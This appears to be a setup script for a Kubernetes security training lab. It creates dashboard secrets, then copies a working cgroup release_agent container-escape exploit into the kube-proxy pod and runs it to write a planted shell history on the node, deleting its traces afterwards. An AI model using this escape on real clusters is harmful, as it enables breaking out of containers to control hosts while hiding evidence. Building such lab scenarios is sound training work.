#!/bin/bash -e

########################################
# Data Gathering

while true; do
	read -rp "Desired Webshell Password: " PASSWORD
	read -rp "Password (again): " secondpassword
	if [ -n "${PASSWORD}" -a "${secondpassword}" = "${PASSWORD}" ]; then
		unset secondpassword
		break
	else
		echo "Passwords do not match."
	fi
done

K8SPASSWORD=$(echo -n "${PASSWORD}" | base64)
K8SUSER=$(echo -n "${USER}" | base64)

########################################
# Apply the k8s config
kubectl apply -f omnibus.yml
kubectl apply -f - <<EOF
apiVersion: v1
kind: Secret
metadata:
  name: dashboard-secret
  namespace: dev
type: Opaque
data:
  username: $K8SUSER
  password: $K8SPASSWORD
---
apiVersion: v1
kind: Secret
metadata:
  name: dashboard-secret
  namespace: prd
type: Opaque
data:
  username: $K8SUSER
  password: $K8SPASSWORD
EOF

# Apply the bonus node content
echo
echo Applying bonus node content
echo

ESC_FILE=$(mktemp)
cat > "${ESC_FILE}" <<'EOF'
#!/bin/sh
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab | head -n1`
touch /tmp/o; echo $t/tmp/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/tmp/o" >/tmp/c;chmod +x /tmp/c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /tmp/o
rm -f /tmp/o;rm -f /tmp/c;rm -f /tmp/run; rm -f /bin/kube-proxy
EOF
chmod 755 "${ESC_FILE}"

CMD="echo 'pwd\nwhoami\nls -al\ndocker ps\ndocker ps -a\ndocker run --privileged -it deadbeef:latest /bin/bash' > /home/kubernetes/.bash_history && chown 600 /home/kubernetes/.bash_history"
KUBE_PROXY_POD_NAME="$(kubectl get pod -n kube-system -l 'component=kube-proxy,tier=node' -o=jsonpath='{.items[].metadata.name}')"
kubectl cp -n kube-system "${ESC_FILE}" "${KUBE_PROXY_POD_NAME}":/tmp/run
kubectl exec -n kube-system "${KUBE_PROXY_POD_NAME}" -- ln -s /bin/sh /bin/kube-proxy
kubectl exec -n kube-system "${KUBE_PROXY_POD_NAME}" -- /bin/kube-proxy -c "/tmp/run \"$CMD\""
rm -rf "${ESC_FILE}"

########################################
# Do other stuff

if ! [ -x "$(command -v nmap)" ]; then
  echo -n "Installing nmap..."
  sudo DEBIAN_FRONTEND=noninteractive apt-get update -q 1> /dev/null 2> /dev/null
  sudo DEBIAN_FRONTEND=noninteractive apt-get install nmap -y -q 1> /dev/null 2> /dev/null
  echo "done."
  exit 1
fi